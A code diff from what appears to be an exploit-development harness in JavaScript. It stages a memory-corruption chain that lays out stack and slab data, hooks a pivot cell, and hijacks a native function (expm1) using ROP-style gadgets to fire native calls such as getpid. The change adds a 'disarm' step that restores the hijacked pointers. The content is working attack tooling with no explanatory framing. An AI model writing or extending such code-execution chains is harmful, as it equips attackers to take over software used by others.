@@ -74,14 +74,14 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, firePivotSmoke,
     layoutSmokeStack, layoutGetpidStack, bisectArmG0, bisectHookPivot, bisectHookPivotPoops,
     bisectFireExpm1, bisectFirePoopsStyle, bisectPreflight, G0_HOOK_OFFS,
-    bisectRestore, fireNativeCallBisect, verifyFullChainSet, verifyBisectChainSet, describeSlabLayout,
+    bisectRestore, bisectDisarmG0, fireNativeCallBisect, verifyFullChainSet, verifyBisectChainSet, describeSlabLayout,
     patchPrepG5, verifySlabAddrs, probePivotCell, bisectHookPivotAt, bisectHookPivotMulti,
     verifyPivotHookWrites,
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830ar";
+const BUILD_ID = "rw-20250830as";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 smoke", title: "atomic layout+fire @ prep (chain_poops callAddr)" },
@@ -98,7 +98,8 @@ const NATIVE_BISECT_STEPS = [
     { id: "expm1", label: "N5 expm1", title: "standalone: sync+layout+multi-hook+expm1 (no N2-N4)" },
     { id: "expm1-h30", label: "N5h +30", title: "hook pivotCell+0x30 only (G0 [rsi+0x30])" },
     { id: "expm1-g5alt", label: "N5b G5alt", title: "G5=expm1+0x53642a then expm1 (after N3+N4)" },
-    { id: "restore", label: "N6 restore", title: "restore pivot + main" },
+    { id: "disarm", label: "N6d disarm", title: "write mainOrig only (G0 off) — safe if N6 OOMs" },
+    { id: "restore", label: "N6 restore", title: "disarm G0 first, then restore pivot slots" },
     { id: "smoke-full", label: "N7 smoke", title: "layout + full fire (smoke)" },
     { id: "layout-getpid", label: "N8 stage lk", title: "layout getpid stub (needs lk in box)" },
     { id: "fire", label: "N9 fire", title: "fire only (after N3+N4+N8 or N7)" },
@@ -4541,12 +4542,10 @@ function runNativeBisectStep(stepId) {
         case "hook-verify":
             requireNativePrep();
             bisectPrepSync(p, off, "pre-N4v");
-            layoutSmokeStack(nativePrep);
-            bisectArmG0(p, nativePrep);
             bisectHookPivotMulti(p, nativePrep, G0_HOOK_OFFS);
             bisectHookVerifyLog(p, nativePrep, G0_HOOK_OFFS, "N4v");
             bisectSnapshot(p, nativePrep, off, "post-N4v");
-            bisectLog("BISECT-OK", "N4v hook verified — NO expm1 (safe)");
+            bisectLog("BISECT-OK", "N4v hook verified — NO G0 arm, NO expm1");
             state("N4v hook OK", "ok");
             break;
         case "expm1-lite":
@@ -4598,10 +4597,22 @@ function runNativeBisectStep(stepId) {
             state("N5b G5alt OK", "ok");
             break;
         }
+        case "disarm":
+            requireNativePrep();
+            bisectFlushBeforeFire();
+            const wasArmed = bisectDisarmG0(p, nativePrep);
+            bisectLog("BISECT-OK", "N6d disarm mainMf→orig armed=" + wasArmed
+                + " orig=" + nativePrep.mainOrig);
+            state("N6d disarm OK", "ok");
+            break;
         case "restore":
             requireNativePrep();
+            bisectFlushBeforeFire();
+            bisectLog("BISECT-WARN", "N6 disarm-first then pivot restore…");
+            bisectDisarmG0(p, nativePrep);
+            bisectFlushBeforeFire();
             bisectRestore(p, nativePrep);
-            mark("BISECT-OK", "N6 restored pivotCell + mainMf");
+            bisectLog("BISECT-OK", "N6 restored pivotCell + mainMf");
             state("N6 restore OK", "ok");
             break;
         case "smoke-full":
